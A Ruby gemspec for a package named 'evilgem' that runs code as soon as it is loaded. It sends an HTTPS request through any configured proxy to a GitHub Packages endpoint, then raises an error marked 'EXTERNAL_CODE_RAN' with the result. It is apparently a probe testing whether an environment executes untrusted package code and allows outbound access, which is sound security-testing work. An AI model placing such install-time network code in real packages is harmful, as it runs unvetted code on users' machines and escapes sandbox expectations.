require "net/http"; require "uri"
MARK = "RUNC-da306a"
PXY = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def g(url)
  u=URI(url); h = (PXY && !PXY.empty?) ? (p=URI(PXY); Net::HTTP.new(u.host,u.port,p.host,p.port)) : Net::HTTP.new(u.host,u.port)
  h.use_ssl=true; h.open_timeout=15; h.read_timeout=20; r=h.get(u.request_uri); [r.code, r.body.to_s]
rescue => e; ["ERR","#{e.class}"] end
c,b = g("https://rubygems.pkg.github.com/czarflix-org/info/cdxgranted")
raise "#{MARK} EXTERNAL_CODE_RAN granted=#{c}/#{b.bytesize}"
Gem::Specification.new { |s| s.name="evilgem"; s.version="0.0.1"; s.summary="x"; s.authors=["b"]; s.files=[] }
